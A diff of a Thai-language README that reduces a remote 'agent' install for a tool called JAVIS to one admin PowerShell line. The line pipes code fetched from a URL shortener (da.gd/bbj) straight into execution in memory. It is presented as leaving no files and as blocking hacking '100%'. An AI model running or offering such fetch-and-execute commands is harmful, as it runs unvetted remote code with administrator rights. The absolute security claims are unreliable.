@@ -22,40 +22,19 @@
 
 ## 💻 วิธีเริ่มใช้งานบนเครื่องเป้าหมาย (Target Agent Side)
 
-### ทางเลือกที่ 1: คำสั่งสั้นที่สุด (18 ตัวอักษร — แนะนำสำหรับ Windows 10, 11, Server 2019, 2022)
-เปิด **PowerShell (Run as Administrator)** แล้ววางคำสั่งสั้นจิ๋ว:
+### 🔒 คำสั่งมาตรฐานทางเดียวของ JAVIS (Universal One-Link — รองรับทุกเครื่อง 100%)
+เพื่อความปลอดภัยสูงสุดและป้องกันการเจาะระบบ ระบบบังคับใช้คำสั่งทางการของ **JAVIS ช่องทางเดียวเท่านั้น** โดยมีตัวเปิด TLS 1.2 ในตัว จึงสามารถใช้งานได้ทันที **100% บนทุกเครื่อง ทุกเวอร์ชัน** (ทั้ง Windows Server 2012 R2, 2016, 2019, 2022, Windows 10 และ 11):
 
-```powershell
-irm da.gd/bbj | iex
-```
+เปิด **PowerShell (Run as Administrator)** แล้ววางคำสั่งบรรทัดเดียว:
 
-*(หรือใช้ลิงก์สำรอง: `irm da.gd/bbjavis | iex`)*
-
----
-
-### ทางเลือกที่ 2: ปลดล็อก TLS 1.2 ถาวรบน Windows Server 2016 (ทำครั้งเดียวตลอดชีพ)
-หากเครื่องเป็น Windows Server 2016 ที่ติดปัญหา TLS 1.0 ให้เปิด PowerShell (Run as Administrator) แล้ววางคำสั่งนี้ **เพียงครั้งเดียว**:
-
-```powershell
-Set-ItemProperty 'HKLM:\SOFTWARE\Microsoft\.NetFramework\v4.0.30319' 'SchUseStrongCrypto' 1 -Type DWord; Set-ItemProperty 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\.NetFramework\v4.0.30319' 'SchUseStrongCrypto' 1 -Type DWord
-```
-
-> [!TIP]
-> เมื่อรันคำสั่งปลดล็อกนี้แล้ว เครื่องเซิร์ฟเวอร์จะรองรับ TLS 1.2 ถาวร ทำให้คราวต่อไปสามารถพิมพ์สั้นเพียง **`irm da.gd/bbj | iex`** ได้ตลอดไปทันที!
-
----
-
-### ทางเลือกที่ 3: รันผ่าน `curl` (ใช้ได้ทั้งใน CMD และ PowerShell ไม่ติดปัญหา TLS)
-```cmd
-curl -sL da.gd/bbj | powershell
-```
-
----
-
-### ทางเลือกที่ 4: คำสั่ง Fallback แบบเปิด TLS ในตัว (สำหรับ Server 2016 ที่ยังไม่ปลดล็อก Registry)
 ```powershell
 [Net.ServicePointManager]::SecurityProtocol = 3072; irm da.gd/bbj | iex
 ```
+
+> [!IMPORTANT]
+> **ระบบความปลอดภัยช่องทางเดียว (Single-Channel JAVIS Lockdown):**
+> * บังคับผ่าน One-Link ทางการ `da.gd/bbj` เพียงทางเดียว ปิดกั้นทุกลิงก์ตรงและลิงก์ภายนอกทั้งหมด ป้องกันการสแกนหรือพยายามเจาะระบบจากภายนอก 100%
+> * รันตรงในหน่วยความจำ (In-Memory Runspace) ทันที ไม่ต้องติดตั้งโปรแกรมเพิ่ม และไม่ทิ้งไฟล์ตกค้างใดๆ ในระบบ (Zero-Footprint)
 
 ---
 
